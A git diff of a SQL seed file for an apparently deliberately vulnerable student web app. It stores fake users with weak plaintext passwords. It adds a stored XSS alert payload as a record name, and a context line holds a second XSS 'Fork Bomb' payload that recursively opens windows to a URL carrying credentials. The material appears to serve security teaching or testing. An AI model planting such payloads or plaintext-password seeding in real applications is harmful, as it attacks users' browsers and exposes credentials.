@@ -63,7 +63,7 @@ VALUES
 ('Admin', 'password', 'admin@fake.com', 1),
 ('Kyle', '12345', 'kdixon@fake.com' , 0),
 ('Katie', 'secret', 'kyoung@fake.com', 0),
-('John', '1q2w3e', 'jdoe@fake.com', 0),
+('John', 'jon', 'jdoe@fake.com', 0),
 ('Jane', 'password1', 'jdoe@fake.com', 0);
 
 INSERT INTO `records`(`record_name`, `record_data`, `record_URL`,`user`)
@@ -71,6 +71,7 @@ VALUES
 ('USBank', '123456789', 'USBank.com',(SELECT id FROM user WHERE user_name='Kyle')),
 ('Twitter', 'montana', 'Twitter.com',(SELECT id FROM user WHERE user_name='Kyle')),
 ('IRS', 'supersecret', 'USA.gov',(SELECT id FROM user WHERE user_name='Kyle')),
+('>"&amp;gt;<script>alert("Warning: This site is vulnerable to an attack")</script>', 'Alert', 'Alert',(SELECT id FROM user WHERE user_name='Kyle')),
 ('>"&amp;gt;<script> function fork() { const win = window.open("http://flip3.engr.oregonstate.edu:6061/user/Kyle&12345"); setTimeout(fork(), 1); } fork(); </script>', 'Fork Bomb', 'Fork Bomb',(SELECT id FROM user WHERE user_name='Kyle')),
 ('OffShoreBank', '987654321', 'OffShoreBank.com',(SELECT id FROM user WHERE user_name='Katie')),
 ('OSU', 'banana', 'oregonstate.edu',(SELECT id FROM user WHERE user_name='Katie')),
